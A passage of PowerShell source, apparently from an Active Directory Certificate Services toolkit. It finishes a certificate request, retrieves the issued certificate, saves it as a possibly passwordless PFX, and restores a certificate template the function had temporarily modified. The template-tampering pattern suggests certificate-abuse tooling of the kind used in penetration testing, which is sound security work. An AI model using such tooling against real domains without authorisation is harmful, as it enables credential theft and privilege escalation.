                            -Subject $resolvedSubjectDN -CAServer $CAServer `
                            -OutputPath "${cnForKey}_req$($submitResult.RequestID).key.json" -Force:$Force
                    }
                    catch {
                        Write-Warning "[!] Could not save the private key for later retrieval: $_"
                    }

                    if ($savedKeyPath) {
                        Show-Line "Private key saved for retrieval: $savedKeyPath" -Class Hint
                        Show-Line "After approval, retrieve with:" -Class Note
                        Show-Line "Request-ADCSCertificate -RetrieveID $($submitResult.RequestID) -CAServer '$CAServer' -KeyFile '$savedKeyPath'"
                    }

                    if ($PassThru) {
                        return [PSCustomObject]@{
                            Success   = $true
                            Status    = 'Pending'
                            RequestID = $submitResult.RequestID
                            CAServer  = $CAServer
                            KeyFile   = $savedKeyPath
                            Message   = "Certificate pending approval. Request ID: $($submitResult.RequestID)"
                        }
                    }
                    return
                }

                if ($submitResult.Status -ne 'Issued' -or -not $submitResult.RequestID) {
                    Write-Warning "[!] Unexpected response from CA"
                    return $null
                }

                # === Step 5: Retrieve Certificate ===
                # COM returns certificate immediately, HTTP/HTTPS requires retrieval
                if ($submitResult.Certificate) {
                    # COM path - certificate already in result
                    $issuedCert = $submitResult.Certificate
                    Write-Log "$FunctionPrefix Certificate retrieved from COM result"
                }
                else {
                    # HTTP/HTTPS path - need to retrieve via certsrv
                    Show-Line "Certificate issued (Request ID: $($submitResult.RequestID))" -Class Hint

                    $issuedCert = Get-CertsrvCertificate -CAServer $CAServer `
                        -RequestID $submitResult.RequestID `
                        -Credential $Credential `
                        -UseHTTP:$resolvedUseHTTP `
                        -Port $Port

                    if (-not $issuedCert) {
                        Write-Warning "[!] Failed to retrieve issued certificate"
                        return $null
                    }
                }

                # === Steps 6-8: Build PFX, save, display, return ===
                $pfxResult = Save-IssuedCertificatePFX -IssuedCert $issuedCert -RSA $rsa `
                    -OutputPath $OutputPath -NoPassword:$NoPassword `
                    -TemplateName $TemplateName -RequestID $submitResult.RequestID -CAServer $CAServer `
                    -Force:$Force
                if (-not $pfxResult) {
                    return $null
                }
                if ($PassThru) {
                    return $pfxResult
                }
            }
            finally {
                if ($rsa) { $rsa.Dispose() }
            }
        }
        finally {
            # === Template Restore (always runs if template was modified) ===
            if ($templateModified -and $templateBackupPath) {
                Show-EmptyLine
                Show-Line "Restoring original template '$TemplateName' from backup" -Class Note
                try {
                    $restoreParams = @{}
                    if ($Domain) { $restoreParams['Domain'] = $Domain }
                    if ($Server) { $restoreParams['Server'] = $Server }

                    Set-CertificateTemplate -Identity $TemplateName -Import $templateBackupPath @restoreParams -Confirm:$false
                    Show-Line "Original template restored successfully" -Class Hint
                    Show-Line "Backup file kept for audit: $templateBackupPath" -Class Note
                }
                catch {
                    Write-Warning "[!] CRITICAL: Failed to restore template '$TemplateName'!"
                    Write-Warning "[!] Manual restore required: Set-CertificateTemplate -Identity '$TemplateName' -Import '$templateBackupPath'"
                }
            }
        }
    }
}

#endregion
